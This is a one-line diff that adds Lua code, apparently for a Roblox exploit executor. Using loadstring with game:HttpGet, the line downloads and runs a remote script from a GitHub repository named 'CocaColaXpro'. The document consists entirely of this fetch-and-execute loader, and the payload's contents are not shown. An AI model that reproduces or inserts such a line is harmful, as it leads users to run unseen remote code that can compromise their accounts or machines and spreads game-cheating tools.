@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/CocaColaXpro/main/Cola"))()
